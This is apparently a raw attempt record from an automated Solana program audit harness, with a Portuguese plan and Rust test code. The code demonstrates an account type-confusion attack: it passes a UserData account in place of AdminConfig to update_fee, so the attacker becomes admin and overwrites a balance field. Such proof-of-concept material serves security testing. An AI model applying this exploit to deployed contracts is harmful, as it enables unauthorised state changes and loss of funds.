attempts.raw:
{
  "plan": "Preparamos uma conta UserData cujo campo authority (bytes 8..40) é a pubkey do atacante, e uma conta AdminConfig legítima cujo admin é uma pubkey diferente. O baseline chama update_fee com a AdminConfig legítima e o admin correto, provando que o cenário está montado. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, com o atacante como signer. O efeito mede se os bytes 40..48 da UserData foram sobrescritos com o novo fee, demonstrando que uma conta de outro tipo foi aceita.",
  "scenario": "let attacker = Pubkey::new_unique();
let legit_admin = Pubkey::new_unique();

let config_key = Pubkey::new_unique();
let user_key = Pubkey::new_unique();

let config_data = anchor_account_data("AdminConfig", &[legit_admin.to_bytes().to_vec(), 100u64.to_le_bytes().to_vec()]);
let user_data = anchor_account_data("UserData", &[attacker.to_bytes().to_vec(), 0u64.to_le_bytes().to_vec()]);

let config_account = account(&env.program_id, &config_data, None);
let user_account = account(&env.program_id, &user_data, None);
let attacker_wallet = wallet(1_000_000_000);
let legit_wallet = wallet(1_000_000_000);

let metas_legit = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(legit_admin, true),
];
let ix_legit = env.anchor_ix("update_fee", &(500u64,), metas_legit);
let contas_legit = vec![
    (config_key, config_account.clone()),
    (legit_admin, legit_wallet.clone()),
];
let r_base = env.baseline("update_fee legitimo com AdminConfig e admin correto", &ix_legit, &contas_legit);

let metas_attack = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(attacker, true),
];
let ix_attack = env.anchor_ix("update_fee", &(999u64,), metas_attack);
let contas_attack = vec![
    (user_key, user_account.clone()),
    (attacker, attacker_wallet.clone()),
];
let r = env.attack("update_fee passando UserData no lugar de AdminConfig", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let user_after = after(&r, &user_key);
    let fee_after = read_u64(user_after.data(), 40);
    env.effect("UserData teve o campo balance (offset 40) sobrescrito com o novo fee", fee_after == 999u64);
}"
}

